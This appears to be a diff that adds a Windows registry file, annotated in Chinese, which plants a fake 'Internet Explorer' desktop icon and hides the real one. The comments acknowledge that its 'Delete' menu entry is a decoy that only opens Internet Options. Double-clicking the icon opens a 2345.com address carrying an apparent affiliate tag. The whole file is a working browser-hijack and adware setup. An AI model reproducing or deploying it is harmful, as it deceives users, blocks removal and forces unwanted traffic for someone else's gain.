@@ -1,0 +1,36 @@
+Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu]
+"{871C5380-42A0-1069-A2EA-08002B30309D}"=dword:00000001
+[HKEY_CLASSES_ROOT\CLSID\{85AEFBE8-763F-0647-899C-A93278894599}]
+@="Internet Explorer"
+;注：这个键值对应的是桌面图标下文字，默认的IE图标下的文字是“Internet Explorer”）
+[HKEY_CLASSES_ROOT\CLSID\{85AEFBE8-763F-0647-899C-A93278894599}\DefaultIcon]
+@="shdoclc.dll,-190" 
+;注：这个键值对应的是图标本身，正常的键值是 shdoclc.dll,-190,可以使用绝对路径指向图标 ）
+;----------------------------------------------------------------------------------------------------
+[HKEY_CLASSES_ROOT\CLSID\{85AEFBE8-763F-0647-899C-A93278894599}\Shell]
+@=""
+[HKEY_CLASSES_ROOT\CLSID\{85AEFBE8-763F-0647-899C-A93278894599}\Shell\D]
+@="删除(&D)" 
+;注：正常的IE键项没有 D 以及 “删除”，这是图标右键菜单里面的假的“删除”命令）。
+[HKEY_CLASSES_ROOT\CLSID\{85AEFBE8-763F-0647-899C-A93278894599}\Shell\D\Command]
+@="Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl"
+[HKEY_CLASSES_ROOT\CLSID\{85AEFBE8-763F-0647-899C-A93278894599}\Shell\属性]
+@="属性"
+[HKEY_CLASSES_ROOT\CLSID\{85AEFBE8-763F-0647-899C-A93278894599}\Shell\属性\Command]
+@="Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl"
+[HKEY_CLASSES_ROOT\CLSID\{85AEFBE8-763F-0647-899C-A93278894599}\Shell\Open]
+@="打开"
+;----------------------------------------------------------------------------------------------------
+;以上部分为右击该图标的菜单内容
+
+[HKEY_CLASSES_ROOT\CLSID\{85AEFBE8-763F-0647-899C-A93278894599}\Shell\Open\Command]
+@="C:\\Program Files\\Internet Explorer\\iexplore.exe www.2345.com/?kc322030"
+;注：双击桌面上的生成的图标执行的程序 ；正常的IE图标command键值内容是 "C:\Program Files\Internet Explorer\iexplore.exe"，也可是其它程序 
+
+[HKEY_CLASSES_ROOT\CLSID\{85AEFBE8-763F-0647-899C-A93278894599}\ShellFolder]
+@=""
+"Attributes"=dword:0000000a
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{85AEFBE8-763F-0647-899C-A93278894599}]
+@="Internet Explorer" 
